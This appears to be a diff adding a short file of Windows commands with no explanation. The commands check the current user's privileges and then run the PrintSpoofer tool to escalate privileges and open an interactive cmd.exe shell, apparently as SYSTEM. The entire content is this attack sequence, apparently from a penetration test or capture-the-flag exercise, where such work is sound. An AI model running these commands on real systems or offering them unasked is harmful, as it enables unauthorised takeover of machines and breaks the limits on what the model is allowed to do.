@@ -1,0 +1,5 @@
+
+
+whoami /all
+printspoofer.exe -i -c cmd.exe
+printspoofer.exe
